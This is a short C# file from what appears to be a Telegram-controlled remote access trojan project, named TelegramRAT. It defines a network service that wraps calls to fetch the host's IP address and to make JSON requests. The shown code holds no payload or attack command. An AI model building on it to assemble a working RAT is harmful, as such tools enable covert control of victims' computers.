namespace TelegramRAT.Services;

public interface INetworkService
{
    Task<string> GetIpAddressAsync(CancellationToken cancellationToken = default);
    Task<T> GetFromJsonAsync<T>(string requestUri, CancellationToken cancellationToken = default);
}

public class NetworkService : INetworkService
{
    public async Task<string> GetIpAddressAsync(CancellationToken cancellationToken = default) => await Utilities.Utils.GetIpAddressAsync(cancellationToken);
    public async Task<T> GetFromJsonAsync<T>(string requestUri, CancellationToken cancellationToken = default) => await Utilities.Utils.GetFromJsonAsync<T>(requestUri, cancellationToken);
}
